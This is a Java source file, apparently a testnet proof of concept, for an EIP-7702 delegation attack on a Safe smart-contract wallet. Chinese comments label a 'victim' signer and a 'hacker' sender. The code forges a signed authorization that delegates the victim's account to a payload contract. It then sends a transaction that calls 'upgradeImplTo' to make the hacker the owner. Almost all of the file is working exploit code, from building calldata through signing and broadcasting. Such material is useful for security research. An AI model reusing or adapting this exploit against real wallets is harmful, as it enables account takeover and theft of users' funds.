package com.tc.test.eip7702;

import com.tc.test.eip7702.impl.Eip7702Transaction;
import com.tc.test.eip7702.model.SetAuthorizationListObject;
import org.web3j.abi.FunctionEncoder;
import org.web3j.abi.datatypes.Address;
import org.web3j.abi.datatypes.Function;
import org.web3j.abi.datatypes.Type;
import org.web3j.crypto.Credentials;
import org.web3j.crypto.Hash;
import org.web3j.crypto.Sign;
import org.web3j.protocol.Web3j;
import org.web3j.protocol.core.DefaultBlockParameterName;
import org.web3j.protocol.core.methods.response.EthSendTransaction;
import org.web3j.protocol.http.HttpService;
import org.web3j.utils.Numeric;

import java.math.BigInteger;
import java.util.*;

import static com.tc.test.Web3Util.*;

/**
 * setAuthorization tx hash 0x6c231a9481fb33c342dff3ee27ea0b71620df3242f0815cf5712f3bd89553514
 */
public class Eip7702Test {

    // safe without guard
    static String safeContractAddress = "0xfd73fc22e1b64dDe28B8c055FffDC79Be8180F49";
    // safe with guarda
//    static String safeContractAddress = "0xEbf288a3C20C2551d42481242D0cA1D8826D20d6";

    static String payloadContractAddress = "0xE03aA9F507B91164Cc044A33796f3A5146463a6c";
    static String signerAddress = "0xe5a7b0c16127f81530352bdce6d5a6c7b07db4ec";
    static String tokenAddress = "0x92cab42fa3f3b63c5f5f2e1ad3334ef927a9588f"; // mock usdc

    static long chainId = 11155111L;

    // sender直接理解为黑客地址
    static String hackerAddress = "0xcecCbBD9bCa111A2F794D78dD58c6470450a6716";
    static BigInteger baseFeeEstimated = new BigInteger("30000000000"); // 30Gwei

    public static void main(String[] args) throws Exception {

        // load 私钥
        Map<String, String> privateKeyPairs = loadPrivateKeyPairsFromLocalFile();

        // load rpc url
        Web3j web3j = Web3j.build(new HttpService(loadHttpRpcUrlFromLocalFile().get(chainId).get(0)));

        // 构造受害者要签名的对象（delegate call到风险合约地址，还是上次的payload合约）
        SetAuthorizationListObject authListObject = new SetAuthorizationListObject(
                chainId, payloadContractAddress,
                web3j.ethGetTransactionCount(signerAddress, DefaultBlockParameterName.LATEST).send().getTransactionCount()
        );

        // 构造受害者需要签名的message
        String hexMsgToSign = authListObject.toMessage();

        // 受害者签名(v = 0/1)
        Sign.SignatureData victimSignature = parseSignatureHexString(signByCredentials(Credentials.create(privateKeyPairs.get(signerAddress)), hexMsgToSign, false));

        // 更新到对象中
        authListObject.updateSignature(victimSignature);

        // 构造攻击者交易的callData
        String eip7702AttackCalldata = buildAttackSafeTxHashCallData(payloadContractAddress, hackerAddress);

        //
        final BigInteger maxTipFee = web3j.ethMaxPriorityFeePerGas().send().getMaxPriorityFeePerGas();//.multiply(new BigInteger("2"));
        final BigInteger maxFee = maxTipFee.add(baseFeeEstimated);//.multiply(new BigInteger("2"));

//        final BigInteger maxTipFee = new BigInteger("10000000000");
//        final BigInteger maxFee = new BigInteger("300000000000");


        // 构造payload交易
        Eip7702Transaction payloadTx = new Eip7702Transaction(
                chainId,
                web3j.ethGetTransactionCount(hackerAddress, DefaultBlockParameterName.LATEST).send().getTransactionCount(),
                BigInteger.valueOf(1000000),
                signerAddress,
                BigInteger.ZERO,
                eip7702AttackCalldata,
                maxTipFee,
                maxFee,
                Arrays.asList(authListObject)
        );

        // 签名payload交易
        String signedTransaction = signEip7702RawTransaction(privateKeyPairs, hackerAddress, payloadTx);
        System.out.println("signed transaction: " + signedTransaction);

        // 发送交易
        EthSendTransaction result = web3j.ethSendRawTransaction(signedTransaction).send();
        if (!result.hasError()) {
            System.out.println(result.getTransactionHash());
        } else {
            System.out.println(result.getError().getMessage());
        }

    }

    private static String buildAttackSafeTxHashCallData(String payloadContractAddress, String ownerAddress) {
        // 构造input param
        List<Type> inputParameters = new ArrayList<>();
        inputParameters.add(new Address(payloadContractAddress));
        inputParameters.add(new Address(ownerAddress));
        // 构造function数据
        Function function = new Function("upgradeImplTo", inputParameters, Collections.emptyList());
        return FunctionEncoder.encode(function);
    }

    public static String signEip7702RawTransaction(Map<String, String> privateKeyPairs, String senderAddress, Eip7702Transaction rawTransaction) throws Exception {
        // 序列化tx数据
        byte[] txRlpBytes = com.tc.test.eip7702.TransactionEncoder.encode(rawTransaction);

        // 得到32字节待签名数据
        byte[] msgToBeSign = Hash.sha3(txRlpBytes);

        String signature = signByCredentials(Credentials.create(privateKeyPairs.get(senderAddress)), Numeric.toHexString(msgToBeSign), false);
        // 得到65字节签名信息
        // 调整v值
        byte[] signatureBytes = Numeric.hexStringToByteArray(signature);
        // 如果签名方法返回的值小于27，就加上27
        if (signatureBytes[signatureBytes.length - 1] < (byte) 27) {
            signatureBytes[signatureBytes.length - 1] = (byte) (signatureBytes[signatureBytes.length - 1] + 27);
        }
        Sign.SignatureData signatureData = parseSignatureHexString(Numeric.toHexString(signatureBytes));

        // 拼装完整的交易上链bytes
        byte[] signedTxBytes = com.tc.test.eip7702.TransactionEncoder.encode(rawTransaction, signatureData);
        return Numeric.toHexString(signedTxBytes);
    }
}
